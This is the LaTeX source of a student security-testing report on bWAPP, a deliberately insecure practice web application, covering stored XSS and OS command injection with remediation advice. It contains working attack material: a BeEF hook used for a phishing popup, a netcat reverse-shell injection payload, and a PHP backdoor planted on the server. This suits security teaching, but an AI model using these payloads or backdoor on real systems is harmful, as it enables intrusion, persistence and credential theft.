\documentclass{article}

% Language setting
% Replace `english' with e.g. `spanish' to change the document language
\usepackage[english]{babel}

% Set page size and margins
% Replace `letterpaper' with `a4paper' for UK/EU standard size
\usepackage[letterpaper,top=2cm,bottom=2cm,left=3cm,right=3cm,marginparwidth=1.75cm]{geometry}

% Useful packages
\usepackage{amsmath}
\usepackage{graphicx}
\usepackage[colorlinks=true, allcolors=blue]{hyperref}
\usepackage{xcolor}
\usepackage[many]{tcolorbox}
\usepackage[T1]{fontenc}
\usepackage{listings}

\definecolor{dkgreen}{rgb}{0,.6,0}
\definecolor{dkblue}{rgb}{0,0,.6}
\definecolor{dkyellow}{cmyk}{0,0,.8,.3}

\lstset{
  language        = php,
  basicstyle      = \small\ttfamily,
  keywordstyle    = \color{dkblue},
  stringstyle     = \color{red},
  identifierstyle = \color{dkgreen},
  commentstyle    = \color{gray},
  emph            =[1]{php},
  emphstyle       =[1]\color{black},
  emph            =[2]{if,and,or,else},
  emphstyle       =[2]\color{dkyellow}
}

\lstset{
  language        = php,
  basicstyle=\ttfamily,
  showstringspaces=false,
  commentstyle=\color{red},
  keywordstyle=\color{blue}
}

\title{\textbf{QASST Project}}
\author{Terec Andrei-Sorin, andrei.terec@stud.ubbcluj.ro\\
Pop David, david.alexandru.pop@stud.ubbcluj.ro\\
George Popovici, george.ioan.popovici@stud.ubbcluj.ro}
\newpage

\begin{document}
\maketitle


\tableofcontents

\newpage

\section{Software Tested}
\label{label:Software_tested}

\textcolor{blue}{Provide 2-3 sentences with details about the application under test. Any type of application is accepted (web application, mobile application, demo app from some Practice Lab, e.g., PortSwigger$->$ Academy$->$ Vulnerabilities Lab, etc.).}

We are testing the bWAPP web application.
bWAPP, or a buggy web application, is a free and open source deliberately insecure web application.
bWAPP is a PHP application that uses a MySQL database. It can be hosted on Linux/Windows with Apache/IIS and MySQL.


\section{Approach on Security}
\label{}

\textcolor{blue}{Describe in 1-2 paragraphs the approach used to address security. \\
    E.g., Defensive testing, offensive testing, or a mixed approach is accepted.
}
We are doing a mixed approach.
Terec Andrei and Popovici George-Ioan are doing offensive testing and Pop David is doing defensive testing.

TODO: dupa ce ne decidem toti despre ce facem, poate mai putem adauga ceva aici

\section{Strategy Applied}
\label{}

\textcolor{blue}{\textit{For the offensive approach} $->$ Provide 1-2 paragraphs to describe the strategy steps used to detect vulnerabilities.\\
    \textit{For the defensive approach} $->$ Detail the code that will be scanned for vulnerabilities.
}

\subsection{Offensive approach}
We are going to manually test different malformed inputs, especially combinations of caracters that are know that can dangerous user input for a web server with PHP and MySQL.
This type of caracters are double quotes and HTML tags
\subsection{Defensive approach}
TODO: Completeaza David


\section{Vulnerabilities}
\label{}

\textcolor{blue}{\textit{For the defensive approach} $->$ \\(1) Use a SAST tool (e.g., Snyk) to scan the code.\\
    (2) Each student that addresses the defensive approach should choose \textbf{min. 3 vulnerabilities} of different severity levels (critical, high, medium, low) to be investigated and remediated later.}

\textcolor{blue}{\textit{For the offensive approach} $->$\\
    Each student that addresses the offensive approach should describe shortly \textbf{2 vulnerabilities} that will be investigated and remediated later.
}

Vulnerability 01. several details (what, how, ...) \textit{CWE-89: SQL Injection} or category \textit{A03:2021-Injection}  \cite{Vuln001} is investigated as data... [reasoning about choosing to investigate the particular vulnerability.]

Vulnerability 01. On the path /bWAPP/xss\_stored\_1.php is a blog post where you can upload comments.
We are going to exploit the vulnerability \textit{CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')} \cite{vul:xss}.
Stored XSS is a type of Cross-Site Scripting vulnerability where malicious scripts are permanently stored on a target server (e.g., in a database, comments, or user profile fields). When other users access the affected page, the script executes in their browsers.

Vulnerability 02. On the path /bWAPP/commandi\_blind.php is a page that pings the ip provided.
We are going to exploit the vulnerability \textit{CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')} \cite{vul:command-injection}

OS Command Injection is a security vulnerability that occurs when an application executes operating system commands using untrusted user input without proper validation or sanitization. Attackers exploit this flaw to inject and execute arbitrary commands on the server, potentially gaining unauthorized access or control.

\section{Aimed Assets}
\label{}

\textcolor{blue}{Describe in 1-2 paragraphs the assets that may be affected by the presence of the selected vulnerabilities.
}

\section{Affected Security Attributes}
\label{}

\textcolor{blue}{Identify the attributes from CIA triad (or CIAAN, CIANA) that are affected by the presence of the selected vulnerabilities, in relationship with the targeted assets.
}


\section{Tools Employed}
\label{}

\textcolor{blue}{Provide min. 1 paragraph with details about \textit{each} tool used to scan the code (e.g., Snyk) or to expose the selected vulnerabilities in the software (e.g., Burp Suite).
    Identify the type of the tool (SAST, DAST) and provide at least 2 benefits of each tool used.
}


\section{Test Design. Test Execution. Test Report}
\label{}

\textcolor{blue}{\textit{For the offensive approach} $->$\\
    (1) For each vulnerability, \\
    -- indicate/identify at least one test design technique employed to design test cases.\\
    -- fill in a table with at least 3 test cases (TCs) that may expose that vulnerability.\\
    (2) For each TC indicate the input, expected output, and the actual result.\\
    (3) Manual testing or tool-based testing can be used (e.g., fuzzing).\\
    (4) Include screenshots or tool-generated reports for the performed scan/testing.}

\textcolor{blue}{\textit{For the defensive approach} $->$\\
    Include a screenshot of the report that consists of \\
    (1) the report summary (\#C, \#H, \#M, \#L) and \\
    (2) details about the vulnerabilities detected.}

\textcolor{blue}{Input of TCs may represent data, some SQL statements, etc. Expected output of TCs is any data or results presented to the user.}

\begin{table} [htpb]
    \centering
    \begin{tabular}{l|l|l|l|l}
        Feature & TC ID & Input1 & Input2 & Expected Output \\ \hline
        F001    & TC01  & 42     & 15     & 100             \\
        F001    & TC02  & 1      & -2     & 3               \\
        F002    & TC03  & 111    & 90     & -74             \\
    \end{tabular}
    \caption{\label{tab:TCs1}TCs table.}
\end{table}

\textcolor{blue}{Table \ref{tab:TCs1} shows the TCs designed to evaluate the vulnerability AAA over F001 and F002.}


\textcolor{magenta}{This section should include test design for all team members.}


\subsection{XSS - Stored (Blog)}
TODO: test design tehnique? Adauga fotografie
\begin{table} [htpb]
    \centering
    \begin{tabular}{l|l|l|l|l}
        Feature & TC ID & Input                     & Expected Output           & Output              \\ \hline
        F001    & TC01  & Test                      & Test                      & Test                \\
        F001    & TC02  & " --                      & " --                      & \textbackslash " -- \\
        F001    & TC03  & <script>alert(1)</script> & <script>alert(1)</script> & Prints out 1        \\
    \end{tabular}
    \caption{\label{tab:TC-XSS}TCs XSS table.}
\end{table}

As we can see in \ref{fig:xss-alert}, the script is executed, this means there is a XSS attack.

\begin{figure}
    \centering
    \includegraphics[width=1\linewidth]{Figures/beef/xss-alert.png}
    \caption{\label{fig:xss-alert}The alert script executed}
\end{figure}



\subsection{OS Command Injection}
TODO: test design tehnique?
Using the knowledge that the server is goind to ping the ip address provided, we can check if the server is vulnerable for OS Command Inject.
We will test on medium difficulty.
Because the output of our command is not shown, this is trickier. One way to get around this is to try to execute the command sleep 5.
If the server waits 5 seconds before sending a response, we know that we managed to inject our command.

\begin{table} [htpb]
    \centering
    \begin{tabular}{l|l|l|l|l}
        Feature & TC ID & Input                  & Expected Output        & Output                 \\ \hline
        F002    & TC01  & 127.0.0.1              & Immediately Terminates & Immediately Terminates \\
        F002    & TC02  & 127.0.0.1; sleep 5     & Immediately Terminates & Immediately Terminates \\
        F002    & TC03  & 127.0.0.1 \&\& sleep 5 & Immediately Terminates & Immediately Terminates \\
        F002    & TC04  & 127.0.0.1 || sleep 5   & Immediately Terminates & Immediately Terminates \\
        F002    & TC05  & 127.0.0.0 || sleep 5   & Immediately Terminates & Waits ~5 seconds       \\
        F002    & TC06  & || sleep 5             & Immediately Terminates & Waits ~5 seconds       \\
        F002    & TC07  & 127.0.0.1 | sleep 5    & Immediately Terminates & Waits ~5 seconds       \\
    \end{tabular}
    \caption{\label{tab:TC-command-injection}TCs OS Command Injection table.}
\end{table}

As we can see in the table \ref{tab:TC-command-injection} and figure \ref{fig:sleep-command}, it seems that only the \& and ; caracters are escaped/removed and we can still exploit it using the "|" caracter.
We can either create an or command with "||". Because of lazy evaluation, the second command will be evaluated only if the first command failed.
We can make the command fail if we don't suply an argument or an invalid one.
The other way we can inject a command is with the pipe operator, which works regardles of if the first command ends with success or failure.

\begin{figure}
    \centering
    \includegraphics[width=1\linewidth]{Figures/command-injection/sleep-command.png}
    \caption{\label{fig:sleep-command}After running the sleep command, the server waits 5 seconds before returning}
\end{figure}


\section{Vulnerability Exploit}
\label{}

\textcolor{blue}{\textit{For the defensive approach} $->$\\
    -- Imagine an attack scenario and attempt to exploit the vulnerability.\\
    -- For successful attempts provide proof of the compromised assets, e.g., screenshot, data extracted, etc.}

\textcolor{blue}{\textit{For the offensive approach} $->$\\
    -- Provide steps executed manually or some script that allows the exploitation of the vulnerability and compromise of the asset(s).\\
    -- Include proof of the asset compromised, i.e., screenshot, data exposed/received, etc. }


\subsection{XSS store exploit}
\label{section:xss-store-exploit}
We can use the beef project to exploit this vulnerability. First, we need to download and install this project on the attacker host from the git repository: https://github.com/beefproject/beef.

After we installed it and run the program, we can expose this service online using port forwarding or a reverse proxy, like ngrok.\ref{fig:beef-server-started}
In this test run, the user machine attacked is in the same LAN network as the attacker, so this step is not needed.

\begin{figure}
    \centering
    \includegraphics[width=1\linewidth]{Figures/beef/beef-server-started.png}
    \caption{\label{fig:beef-server-started}beef server started}
\end{figure}


Now we need to install the hook using the xss vulnerability we found earlier. In our case, the hook url is at http://10.0.2.15:3000/hook.js
For this we need to send a comment with our script hook. \ref{fig:inject-hook}
Now, we are in. Every user that wants to see the comments will automatically load our javascript script, unless they have disabled javascript execution.
When a user sees the comment section, we get a lot of informations about them, like the browser they are using, the operation system, the browser plugins installed, the device width and height, arhitecture, number of CPU cores and much more without the user even clicking a malicious link.

\begin{figure}
    \centering
    \includegraphics[width=1\linewidth]{Figures/beef/inject-hook.png}
    \caption{\label{fig:inject-hook}Injecting the javascript hook into the website}
\end{figure}

\begin{figure}
    \centering
    \includegraphics[width=1\linewidth]{Figures/beef/browser-details.png}
    \caption{\label{fig:browser-details}User browser informations}
\end{figure}


Now, from the Commands tab, we can send malicious comamnds to this user. For example, we can send them a popout that they need to login again into their facebook account. \ref{fig:send-pretty-theft}
After clicking the Execute button, the user is less prepared for this to be a phishing attempt, because they are on a site they trust and is more likely that they will fill the data requested by the phishing attempt. \ref{fig:filling-phishing-attempt}
When the user presses log in, the data is send to the attacker and the phishing attack has a succes. \ref{fig:filling-phishing-attempt}


\begin{figure}
    \centering
    \includegraphics[width=1\linewidth]{Figures/beef/send-pretty-theft.png}
    \caption{\label{fig:send-pretty-theft}How we can send a phishing attack using beef}
\end{figure}

\begin{figure}
    \centering
    \includegraphics[width=1\linewidth]{Figures/beef/filling-phishing-attempt.png}
    \caption{\label{fig:filling-phishing-attempt}How the phishing attack looks for the user}
\end{figure}

\begin{figure}
    \centering
    \includegraphics[width=1\linewidth]{Figures/beef/data-received.png}
    \caption{\label{fig:data-received}The collected data from the user}
\end{figure}

\subsection{OS Command Injection}
So far we have tried to run a sleep command to check if the payload works. Now that we know that it does, we can exploit it.
We can get a reverse shell using the command nc <attacker\_ip> <attacker\_port> -e /bin/bash.
In our case, nc 10.0.2.15 4747 -e /bin/bash.

So the full payload, in our case is 127.0.0.1|nc 10.0.2.15 4747 -e /bin/bash.

Before sending this payload, we run on the attacker host the command nc -lvp 4747 to listen for incoming connections.

After the payload is send, we can see a new connection and we have access to the host terminal.
Because the host also has python installed, we can easily turn this into an interactive terminal running the command python -c "import pty; pty.spawn('/bin/bash')"
\ref{fig:inject-code}
\begin{figure}
    \centering
    \includegraphics[width=1\linewidth]{Figures/command-injection/inject-code.png}
    \caption{\label{fig:inject-code}The injected code}
\end{figure}

In case this vulnerability gets fixed, we can now install a backdoor into the server so we will still have access to it.
For this, we will insert a php script that gives a reverse shell.\ref{php:backdoor}

\begin{lstlisting}[language=php,caption={Backdoor Code},label=php:backdoor]
<?php
exec("nc " . $_GET["server"] . " " . $_GET["port"] . " -e /bin/bash");"
\end{lstlisting}

And we can write this backdoor using our reversed shell.
\begin{lstlisting}[language=bash,caption={Backdoor Code in bash},label=bash:backdoor]
echo "<?php
exec(\"nc \".\$_GET[\"server\"].\" \".\$_GET[\"port\"].\" -e /bin/bash\");"
\end{lstlisting}

We piped the command \ref{bash:backdoor} into the file inserted\_backdoor.php and now when we acces the url "http://10.0.2.4/bWAPP/inserted\_backdoor.php?server=10.0.2.15 \&port=4747",
the server will give us a reverse shell. \ref{fig:backdoor-installed}

\begin{figure}
    \centering
    \includegraphics[width=1\linewidth]{Figures/command-injection/backdoor-installed.png}
    \caption{\label{fig:backdoor-installed}How to connect to the server after the backdoor has installed}
\end{figure}

\subsection{Manual Exploit}
\label{}

\textcolor{blue}{-- commands provided to extract data}

\textcolor{blue}{-- screenshots}


\subsection{Automated Exploit}
\label{}
\textcolor{blue}{- a piece of code (Python, Java, etc.) that automates the vulnerability exploited such that data is extracted/changed/updated/compromised as using/exploiting the vulnerability.}



\section{Remediation Steps}
\label{}

\textcolor{blue}{\textit{For the offensive approach} $->$\\
    (1) Indicate steps to provide vulnerability remediation. E.g., piece of code, particular recommendations, etc.}

\textcolor{blue}{\textit{For the defensive approach} $->$\\
    (1) Remediate/neutralize the vulnerabilities selected (3+) following the SAST tool recommendations.}\\
\textcolor{blue}{(2) For each vulnerability indicate the change in the code that is applied to fix the vulnerability. If there are multiple solutions available provide reasoning for the selected one.} \\
\textcolor{blue}{(3) Perform re-scan to prove the removal of the vulnerability, i.e., include a screenshot with a report summary (\#C, \#H, \#M, \#L) and details about the vulnerabilities re-detected.}

\subsection{XSS attack}
\label{xss-attack}
To find out how we can remediat this attack, we need to see the source code.


\begin{lstlisting}[language=php, caption={XSS Code},label=php:xss-attack]
while($row = $recordset->fetch_object())
{

    if($_COOKIE["security_level"] == "2")
    {



?>
        <tr height="40">

            <td align="center"><?php echo $row->id; ?></td>
            <td><?php echo $row->owner; ?></td>
            <td><?php echo $row->date; ?></td>
            <td>
            <?php echo htmlspecialchars($row->entry, ENT_QUOTES, "UTF-8"); ?>
            </td>

        </tr>

<?php

    }

    else
        
        if($_COOKIE["security_level"] == "1")
        {

?>
        <tr height="40">

            <td align="center"><?php echo $row->id; ?></td>
            <td><?php echo $row->owner; ?></td>
            <td><?php echo $row->date; ?></td>
            <td><?php echo addslashes($row->entry); ?></td>

        </tr>

<?php

        }
        
        else        

            {

?>
        <tr height="40">

            <td align="center"><?php echo $row->id; ?></td>
            <td><?php echo $row->owner; ?></td>
            <td><?php echo $row->date; ?></td>
            <td><?php echo $row->entry; ?></td>

        </tr>

<?php          

            }

}
\end{lstlisting}

The relevant section is \label{php:xss-attack}, where we can see how the data is displayed.
When the security level is 0, or low, they don't attempt to process the data and sends it into a html page as it is. This allows XSS and html injection attacks.
When the security level is 1, or medium, they prepare the string using the addslashes php function.
This function does the following:


addslashes - returns a string with backslashes before characters that need to be quoted in database queries etc.
These characters are single quote ('), double quote ("), backslash (\textbackslash) and NUL (the NULL byte).


This doesn't say anything about < and > caracters, as this function is used to prevent SQL Injection attacks, not XSS attacks.
So the medium difficulty also doesn't prevent the attack described in section \ref{section:xss-store-exploit}.

The high security level, when security\_level is set to 2, is how we can remediate this error.
Using the correct function, htmlspecialchars, it escapes all html special caracters and the script no longer works. \ref{fig:no-longer-works}

\begin{figure}
    \centering
    \includegraphics[width=1\linewidth]{Figures/beef/no-longer-works.png}
    \caption{\label{fig:no-longer-works}XSS attack remediation}
\end{figure}

\subsection{Command Injection}
From the test we can already tell that there are improper parameter validation on medium security. On low difficulty there is no validation.

We can see that on medium security, only the \& and ; caracters are deleted, leaving the | caracters as they are.
A bad way to fix it would be to also remove the | caracters, as you don't include the redirect operators and in always better to have a whitelist of caracters, rather than a blacklist.
The way to fix it is using the escapeshellcmd command, as it is used on the hard security level
\begin{lstlisting}[language=php,caption={Backdoor Code},label=php:command-injection-code]
function commandi_check_1($data)
{
    
    $input = str_replace("&", "", $data);
    $input = str_replace(";", "", $input);
    
    return $input;
    
}

function commandi_check_2($data)
{
   
    return escapeshellcmd($data);
    
}

function commandi($data)
{

    switch($_COOKIE["security_level"])
    {

        case "0" :

            $data = no_check($data);
            break;

        case "1" :

            $data = commandi_check_1($data);
            break;

        case "2" :

            $data = commandi_check_2($data);
            break;

        default :

            $data = no_check($data);
            break;

    }

    return $data;

}


shell_exec("ping -c 1 " . commandi($target));
\end{lstlisting}


\section{Conclusions}
\label{}

Is important to correctly validate user input. The best way to validate user input is with predefined functions like \textit{htmlspecialchars}, \textit{addslashes}, \textit{escapeshellcmd}.
When such function are not available, always have a whitelist of caracters instead of a blacklist.
In case you miss a caracter from the whitelist, at worst case the user experiance is not the greatest, but if you miss a caracter from a blacklist, you leave yourself vulnerable to have a backdoor installed on your server, even after you remediate the error.
\textcolor{blue}{Include final conclusions, lessons learned and personal considerations while working on QASSTP (3-4 paragraphs).\\
    You can focus on the following aspects: type of application to be tested, amount of knowledge to use (related or not to testing), tools required to apply, team collaboration, amount of time needed to fulfill the tasks, etc.}

\section{Other sections...}

\textcolor{blue}{Please remove this section and all subsections.}
\subsection{How to include Figures}

First you have to upload the image file from your computer using the upload link in the file-tree menu. Then use the includegraphics command to include it in your document. Use the figure environment and the caption command to add a number and a caption to your figure. See the code for Figure \ref{fig:frog} in this section for an example.

Note that your figure will automatically be placed in the most appropriate place for it, given the surrounding text and taking into account other figures or tables that may be close by. You can find out more about adding images to your documents in this help article on \href{https://www.overleaf.com/learn/how-to/Including_images_on_Overleaf}{including images on Overleaf}.

\begin{figure}
    \centering
    \includegraphics[width=0.25\linewidth]{Figures/frog.jpg}
    \caption{\label{fig:frog}This frog was uploaded via the file-tree menu.}
\end{figure}


\subsection{How to add Citations and a References List}

You can simply upload a \verb|.bib| file containing your BibTeX entries, created with a tool such as JabRef. You can then cite entries from it, like this: \cite{greenwade93}. Just remember to specify a bibliography style, as well as the filename of the \verb|.bib|. You can find a \href{https://www.overleaf.com/help/97-how-to-include-a-bibliography-using-bibtex}{video tutorial here} to learn more about BibTeX.

If you have an \href{https://www.overleaf.com/user/subscription/plans}{upgraded account}, you can also import your Mendeley or Zotero library directly as a \verb|.bib| file, via the upload menu in the file-tree.


\bibliographystyle{alpha}
\bibliography{sample}

\end{document}